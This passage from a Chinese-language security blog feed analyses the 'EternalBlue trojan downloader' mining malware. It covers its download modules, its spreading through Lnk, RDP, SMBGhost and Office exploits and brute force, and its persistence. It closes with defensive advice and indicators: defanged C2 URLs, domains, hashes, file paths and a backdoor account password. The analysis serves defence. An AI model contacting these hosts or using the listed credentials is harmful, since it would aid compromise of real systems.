href="#01-新的攻击前准备模块a-jsp" class="headerlink" title="01 新的攻击前准备模块a.jsp"></a>01 新的攻击前准备模块a.jsp</h2><p>​    该模块近期下载C2为t[.]amynx.com，该文件也有多个版本的变迁，这里通过其中版本较新的一份样本对主要行为进行分析，样本信息如下：</p><table><thead><tr><th>名称</th><th>MD5</th></tr></thead><tbody><tr><td>a.jsp</td><td>ff75c064248579f4bdabec6d6dba89d6</td></tr></tbody></table><p>​    该样本主要完成了对于如下介绍的一些传播模块和挖矿模块进行下载，是最新的攻击前置准备模块，具体行为如下，其中函数SIEX为封装的下载并执行脚本函数：</p><ol><li>会在对应条件满足情况下对传播模块进行下载，下载的传播模块有Windows下的传播模块if.bin和Linux下的传播模块kr.bin，内置传播模块信息如下，用于验证 ：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162458.png"></p><ol start="2"><li>依据系统版本不同，下载对应的32/64位挖矿程序me3.exe/m6.bin(经检测32位暂时没有下载)。另外对于存在独立显卡(N卡/A卡)的主机，会下载显卡挖矿脚本m6g.bin同时进行挖矿，内置挖矿脚本信息如下，用于验证：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162525.png"></p><ol start="3"><li>如果主机有N卡，则同时会下载XMRig的CUDA插件到%AppData%\temp\nvdg.dat，用于支持显卡挖矿：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162542.png"></p><ol start="4"><li>检测当前机器Outlook存在状态，据此下载钓鱼邮件相关的攻击组件if_mail.bin并执行，该组件后面进行分析说明：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162603.png"></p><ol start="5"><li>依据temp目录下的日志文件kk4kk.log存在状态，来进行ode.bin脚本的下载执行：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162622.png"></p><p>​    ode.bin主要完成了对20.dat的下载，下载IP为167.99.154.202，命名为4到8位随机字符组成字串.exe。然后创建同名计划任务定时启动样本，或者通过计划任务定时启动tt.vbs脚本，再通过脚本启动样本来完成持久化操作：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162638.png"></p><p>​    </p><p>​    该样本(ef3a4697773f84850fe1a086db8edfe0)和最开始所述的未加签名的python传播模块类似，包含了永恒之蓝攻击、MSSQL爆破攻击、IPC$爆破攻击、SMB爆破攻击等，猜测其可能是为了对越来越复杂的传播模块进行攻击组件的切割，为其后续的某些行为做准备。</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162711.png"></p><h2 id="02-无文件攻击新添加组件说明"><a href="#02-无文件攻击新添加组件说明" class="headerlink" title="02 无文件攻击新添加组件说明"></a>02 无文件攻击新添加组件说明</h2><p>​    “永恒之蓝木马下载器”系列木马的更新是一个频繁且长久的过程，要想完整的对更新链进行详细描述，怕是能讲三天三夜。所以这里我们长话短说，重点着墨于其关键更新的节点，对后续添加的攻击组件及其行为进行分析说明。</p><ol><li><p>Lnk漏洞攻击添加:</p><p>紧接上述的无文件挖矿模块被添加之后，在19年7月19日，检测到攻击组件又被进行了扩展，添加了Lnk漏洞(CVE-2017-8464)相关的攻击.</p><p>首先会检测可移动设备和网络共享盘存在状态，然后向检测到的目标盘目录中释放木马文件blue3.bin、blue6.bin、readme.js，以及带漏洞的Lnk文件:</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162834.png"></p><p>​    释放木马及Lnk文件部分代码如下图所示，其释放的Lnk文件，文件名为D ~K开头+任意一个释放的木马文件文件名，用于执行同目录下的木马文件：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162901.png"></p><p>​    CVE-2017-8464漏洞可怕之处在于其只要打开了Lnk文件所在目录就已经进行了恶意操作的执行，其会去下载usb.jsp进行后续攻击。</p><ol start="2"><li>在19年10月9日检测到攻击组件对于RDP远程执行漏洞(CVE-2019-0708)的添加，完成了对于该漏洞的检测上报，依旧利用该漏洞进行横向传播，攻击成功后远程执行命令下载rdp.jsp到目标机中直接执行。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162916.png"></p><ol start="3"><li>20年4月开始，攻击组件中加入了钓鱼邮件的传播方式，邮件附件doc中包含了office远程代码执行漏洞(CVE-2017-8570），邮件内容和Covid-19(新冠病毒)相关，关键的攻击代码在if_mail.bin脚本中，会通过当前用户的Outlook邮箱进行邮件的发送。其中部分邮件相关信息如下：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162935.png"></p><p>​    当被攻击用户运行doc文档后，会触发漏洞下载执行后续脚本mail.jsp。</p><p>​    此时也增加了一个小组件BypasUAC，其在脚本7p.jsp中，部分代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162950.png"></p><ol start="4"><li>20年5月21号检测到SMBGhost漏洞(CVE-2020-0796)相关的组件添加，以及SSH爆破攻击相关组件添加，在后续对它们进行了利用，攻击成功后也会远程下载对应的后续脚本smbh.jsp和ssh.jsp并执行。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163008.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163018.png"></p><ol start="5"><li><p>另外还有部分攻击组件包括Linux攻击，从20年6月10左右开始新增，也将其攻击代码列举如下：</p><p>IPC$攻击，攻击完成后远程下载对应脚本ipc.jsp并执行：</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163034.png"></p><p>​    Redis未授权访问漏洞攻击，攻击完成后远程下载对应脚本red.jsp并执行</p><p><img src="C:\Users\hskul\AppData\Roaming\Typora\typora-user-images\image-20211029163046827.png" alt="image-20211029163046827"></p><p>​    Yarn未授权访问漏洞，攻击Linux服务器集群，完成后运行挖矿木马：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163056.png"></p><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><p>​    本文粗略分析了”永恒之蓝木马下载器”各个阶段所使用的攻击手段。虽然文章结束了，但是该挖矿病毒的演化还在继续。</p><p>​    从上文的分析来看，该病毒作者采用了各种常见的攻击方式来传播该病毒，导致此病毒有极强的传播能力。这也是为何本文一开始说该病毒在内网的流行度可以作为内网安全性的一个指标。</p><p>​    “永恒之蓝木马下载器”病毒另一个需要关注的点在于其模块化的攻击手段，作者甚至可以将较新的漏洞嵌入到病毒的整个传播流程中。由此可见该病毒的整个架构已经较为成熟，安全运维人员在处置最新的漏洞时弱反应较慢，此病毒很容易在内网中形成传播的趋势。</p><h1 id="5-安全建议"><a href="#5-安全建议" class="headerlink" title="5. 安全建议"></a>5. 安全建议</h1><ol><li>安装杀毒软件对病毒进行预防和查杀。</li><li>关闭不必要的端口，包括但不限于135、139、445、3389等。</li><li>修改默认密码，使用强度较高的密码，做到定期更新，一机一码。</li><li>对于相关的漏洞，如永恒之蓝系列漏洞、CVE-2017-8464 、CVE-2017-8570、CVE-2019-0708、CVE-2020-0796。</li><li>提高员工的安全意识，做到定期科普。</li></ol><h1 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h1><p><strong>MD5</strong>：</p><p>def0e980d7c2a59b52d0c644a6e40763</p><p>f79cb9d2893b254cc75dfb7f3e454a69</p><p>74e2a43b2b7c6e258b3a3fc2516c1235</p><p>2e9710a4b9cba3cd11e977af87570e3b</p><p>def0e980d7c2a59b52d0c644a6e40763</p><p>95adf923ba32cc5004277867181680c8</p><p>31ce6662be59ca4c01c1730bc7150f19</p><p>e05827e44d487d1782a32386123193ef</p><p>55f0dd8c306db9fc8b9e45705cd66598</p><p>c17cdee1afdc272a46b1cf25c1f44dcc</p><p>24c4149468926bedcb41f50ac88b40f3</p><p>4ec29049ac81521c37dad2da6754d6a3</p><p>888dc1ca4b18a3d424498244acf81f7d</p><p>3162e619f8eb49f4dd6b48cb09075e10</p><p>94838EDD7470271386153D3B89FE6A6C    </p><p>e561003b347f391eec44759de1da5ebf</p><p>ff75c064248579f4bdabec6d6dba89d6</p><p>2ae7f2f4f0b114ed074ba191acf1665a</p><p>ef3a4697773f84850fe1a086db8edfe0</p><p><strong>URL</strong>：</p><p>hxxp://pull[.]update[.]ackng[.]com/</p><p>hxxp://dl[.]haqo[.]net/</p><p>hxxp://i[.]haqo.net/i.png</p><p>hxxp://p[.]abbny.com/im.png</p><p>hxxp://v[.]beahh.com/v+$env:USERDOMAIN</p><p>hxxp://w[.]beahh.com/page.html?p%COMPUTERNAME%</p><p>hxxp://v[.]beahh.com/ipc?low1</p><p>hxxp://info[.]haqo.net/e.png?</p><p>hxxp://info[.]beahh.com/e.png?</p><p>hxxp://info[.]abbny.com/e.png?</p><p>hxxp://d[.]beahh.com/update.png?p=11</p><p>hxxp://172[.]104.177.202/new.json?11</p><p>hxxp://172[.]104.177.202/new.dat?11</p><p>hxxp://v[.]y6h.net/g?</p><p>hxxp://down[.]beahh.com/new.dat?allv5</p><p>hxxp://down[.]beahh.com/mn.dat?allv5</p><p>hxxp://p[.]beahh.com/upgrade.php?ver=5&amp;mac=</p><p>hxxp://t.zz3r0[.]com/a.jsp?</p><p>hxxp://t.zer9g[.].com/a.jsp?</p><p>hxxp://t.amynx[.]com/a.jsp?</p><p>hxxp://t.amynx[.]com /ms.jsp?</p><p>hxxp://t.amynx[.]com /mso.jsp?</p><p>hxxp://t.amynx[.]com /7p.php?</p><p>hxxp://t.amynx[.]com /usb.php?</p><p>hxxp://t.amynx[.]com /ln/core.png?</p><p>hxxp://t.amynx[.]com /smgh.jsp?</p><p>hxxp://t.amynx[.]com /rdp.jsp</p><p>hxxp://t.amynx[.]com/ipc.jsp</p><p>hxxp://d.ackng[.]com/if.bin?</p><p>hxxp://d.ackng[.]com/nvd.zip</p><p>hxxp://d.ackng[.]com/if_mail.bin?</p><p><strong>Domain</strong>：</p><p>pull[.]update[.]ackng[.]com</p><p>dl[.]haqo[.]net</p><p>i[.]haqo.net    </p><p>p[.]abbny.com</p><p>v[.]beahh.com</p><p>w[.]beahh.com</p><p>info[.]haqo.net</p><p>info[.]beahh.com</p><p>info[.]abbny.com</p><p>d[.]beahh.com</p><p>down[.]beahh.com</p><p>p[.]beahh.com</p><p>t[.]zz3r0.com</p><p>t[.]zer9g.com</p><p>t[.]amynx.com</p><p>t[.]ackng.com</p><p><strong>文件</strong>：</p><p>c:\windows\temp\updater.exe</p><p>c:\windows\system32\svhost.exe</p><p>c:\windows\system32\drivers\svchost.exe</p><p>c:\windows\system32\drivers\taskmgr.exe</p><p>c:\windows\system32\wmiex.exe</p><p>c:\windows\temp\svchost</p><p>c:\windows\temp\m2.ps1</p><p>c:\windows\temp\mkatz.ini</p><p><strong>注</strong>：在64位系统中c:\windows\system32替换为c\windows\SysWOW64</p><p><strong>计划任务</strong>：</p><p>svhost、server、Ddrivers、WebServers、Credentials、DnsScan、Bluetooths、00-00-00-00-00-00(MAC地址命名)、blackball、Rtsa2、Rtsa1、Rtsa、bluetea</p><p><strong>重点关注账户：</strong></p><p>Name：k8h3d</p><p>Password：k8d3j9SjfS7</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    本文是作者在奇安信威胁情报中心公众号发布的文章&lt;a href=&quot;https://mp.weixin.qq.com/s/mMi5fHtBPuN09uH6FKm0_g&quot;&gt;永恒的对手：永恒之蓝挖矿木马的前世今生&lt;/a&gt;，这里在个人博客做个记录。&lt;/p&gt;
&lt;h1 id=&quot;</summary>
      
    
    
    
    <category term="样本分析" scheme="http://example.com/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="样本分析" scheme="http://example.com/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    <category term="永恒之蓝" scheme="http://example.com/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    
  </entry>
  
</feed>
